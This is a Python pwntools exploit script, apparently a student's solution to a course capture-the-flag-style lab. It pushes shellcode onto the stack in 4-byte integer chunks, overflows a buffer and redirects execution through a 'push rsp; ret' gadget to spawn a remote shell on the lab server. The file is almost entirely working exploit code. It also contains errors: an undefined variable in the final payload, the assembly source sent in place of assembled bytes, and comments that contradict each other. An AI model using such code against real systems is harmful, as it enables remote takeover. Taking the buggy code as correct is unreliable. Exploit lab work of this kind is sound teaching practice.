from pwn import *

def put_shellcode_on_stack(binary_code, exploitable_process):
    # This function is designed to read shellcode and push it onto the stack.
    # Because the victim program only accepts string representations of integers (4 bytes),
    # I needed to break down the shellcode into packets of this size.
    # To do this, I chose to use recursion.

    # First, I read in the four bytes of the assembled shell code.
    # At the same time, I convert those bytes into an integer.
    code_as_int = u32(binary_code[:4])

    # I turn the int into a string to be accepted by the program input.
    # To send it using pwntools, I encode it into a byte and pass it to the program.
    exploitable_process.sendlineafter(b"number:", str(code_as_int).encode())

    # Because the recursive function call will result in an IndexError once I run out of bytes to read,
    # I handle the error safely to continue my exploit code running.
    try:
        # I check if there are any remaining bytes to read.
        if binary_code != b'':
            # If there are, I call the function again to read the remaining portion.
            put_shellcode_on_stack(binary_code[4:], exploitable_process)
    except IndexError:
        return
    return

if __name__ == "__main__":

    # Declaring some variables that will be used later.
    local_binary_file = "./lab2-3.bin"
    remote_server = "csc748.hostbin.org"
    remote_port = 7023

    #### PREPARATION ####

    # I start by preparing some shellcode.
    # I use the pwntools built-in shellcraft function to generate some for me.
    context.arch = "amd64"
    shellcode = shellcraft.amd64.linux.sh()

    # In order to execute my shellcode after I push it onto the stack, 
    # I need to jump back to the stack.
    # Using 'ropper -f lab2-3.bin -j rsp', I was able to locate the command 'push rsp, ret' in the victim code.
    # The address of these instructions is 0x4013d6, so I save them for later use.
    trampoline_address = 0x4013d6

    #### EXPLOITATION ####
    
    # I can now run the process. The following lines are various forms for different purposes.
    process_to_exploit = remote(remote_server, remote_port)
    # process_to_exploit = process(local_binary_file)
    # process_to_exploit = gdb.debug(local_binary_file)

    # To overflow the buffer, I prepare to send 128+8 bytes.
    buffer_overflower = b"0"*136

    # Now, I'm ready to send in the shellcode. 
    # As mentioned, I can only send in 32-bits at a time. 
    # So, I have to break the code up. 
    # See the function above for an explanation of how and why I chose to handle that problem.
    machine_code = asm(shellcode)
    put_shellcode_on_stack(machine_code, process_to_exploit)

    # Now I send the full attack to the process.
    # This causes the process to overflow the buffer, jump to "call rsp", and execute the shellcode.
    process_to_exploit.sendline(buffer_overflower + instruction_redirect + shellcode)

    # Now I can drop into a shell.
    process_to_exploit.interactive()